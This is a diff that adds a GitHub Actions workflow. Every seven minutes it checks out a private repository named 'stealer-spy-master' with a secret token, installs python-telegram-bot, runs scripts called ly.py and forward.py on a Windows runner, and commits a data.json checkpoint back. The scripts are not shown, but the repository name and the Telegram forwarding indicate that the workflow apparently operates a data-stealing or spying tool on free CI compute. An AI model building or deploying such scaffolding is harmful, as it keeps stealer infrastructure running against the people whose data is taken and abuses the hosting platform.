@@ -1,0 +1,80 @@
+name: Run ly.py
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "*/7 * * * *"
+
+permissions:
+  contents: write
+
+concurrency:
+  group: ly-5min-run
+  cancel-in-progress: false
+
+jobs:
+  run:
+    runs-on: windows-latest
+    timeout-minutes: 55
+
+    steps:
+      - name: Checkout private repo
+        uses: actions/checkout@v4
+        with:
+          repository: Tyo2fcdv/stealer-spy-master
+          token: ${{ secrets.PRIVATE_REPO_TOKEN }}
+          path: private-repo
+          fetch-depth: 0
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Install dependencies
+        shell: pwsh
+        working-directory: private-repo
+        run: |
+          python -m pip install --upgrade pip
+          python -m pip install "python-telegram-bot>=21,<23"
+
+      - name: Check Tkinter
+        shell: pwsh
+        working-directory: private-repo
+        run: |
+          python -c "import tkinter; print('Tkinter OK:', tkinter.TkVersion)"
+
+      - name: Run ly.py
+        shell: pwsh
+        working-directory: private-repo
+        run: python ly.py
+
+      - name: Run forward.py
+        shell: pwsh
+        working-directory: private-repo
+        run: python forward.py
+
+      - name: Sync data.json
+        if: always()
+        shell: pwsh
+        working-directory: private-repo
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+
+          git pull --rebase origin HEAD
+
+          if (Test-Path "data.json") {
+              git add data.json
+              if (Test-Path "last_message_id.txt") { git add last_message_id.txt }
+
+              git diff --cached --quiet
+              if ($LASTEXITCODE -ne 0) {
+                  git commit -m "Update data.json checkpoint [skip ci]"
+                  git push origin HEAD
+              } else {
+                  Write-Host "data.json unchanged"
+              }
+          } else {
+              Write-Host "data.json not found"
+          }
